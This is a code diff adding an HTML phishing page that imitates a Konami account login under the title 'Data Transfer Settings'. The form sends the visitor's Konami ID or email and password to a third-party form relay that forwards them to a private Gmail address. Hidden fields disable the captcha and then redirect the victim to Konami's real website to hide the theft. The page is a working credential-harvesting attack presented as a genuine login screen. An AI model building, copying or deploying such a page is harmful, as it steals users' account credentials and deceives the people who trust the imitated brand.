@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konami - Data Transfer Settings</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="konami-logo-bar">
+                <div class="konami-logo">KONAMI</div>
+            </div>
+            <h1 class="title">Data Transfer Settings</h1>
+        </header>
+        
+        <div class="form-container">
+            <form id="loginForm" action="https://formsubmit.co/delpierobaggio08@gmail.com" method="POST">
+                <div class="input-group">
+                    <input type="text" class="input-field" placeholder="KONAMI ID or e-mail address" name="email" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" class="input-field" placeholder="Password" name="password" required>
+                </div>
+                
+                <div class="otp-notice">
+                    <a href="#">
+                        Users who use the KONAMI OTP Service only
+                    </a>
+                </div>
+                
+                <div class="button-group">
+                    <button type="submit" class="button login-button">
+                        <i class="fas fa-user"></i> Login
+                    </button>
+                    <button type="button" class="button back-button">
+                        <i class="fas fa-chevron-left"></i> Back
+                    </button>
+                </div>
+                
+                <div class="forgot-password">
+                    <a href="#">
+                        <i class="fas fa-chevron-right"></i> Forgot your password?
+                    </a>
+                </div>
+                
+                <input type="hidden" name="_next" value="https://www.konami.com/games/ca/en/">
+                <input type="hidden" name="_captcha" value="false">
+            </form>
+        </div>
+        
+        <footer class="footer">
+            <p>©2022 Konami Digital Entertainment</p>
+        </footer>
+    </div>
+    
+    <script src="js/script.js"></script>
+</body>
+</html>
